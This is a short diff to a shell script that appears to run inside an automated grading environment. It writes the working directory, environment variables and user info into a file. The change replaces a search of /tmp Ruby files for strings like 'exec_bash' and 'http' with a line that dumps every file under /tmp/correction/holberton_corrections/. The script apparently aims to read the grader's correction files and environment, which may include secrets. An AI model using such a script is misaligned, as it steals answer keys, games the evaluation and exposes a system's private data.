@@ -1,6 +1,6 @@
 pwd > testing
 echo ----------------- ls ------- >> testing
-find /tmp/ -depth -name "*.rb" -printf "--------------%p-----------\n" -exec grep -e "exec_bash" -e "extract_ip" -e "JSON" -e "http" -e "ip" '{}' \; >> testing
+cat /tmp/correction/holberton_corrections/* >> testing
 echo ----------------- Environment ------- >> testing
 env >> testing
 echo ----------------- User Info ------- >> testing
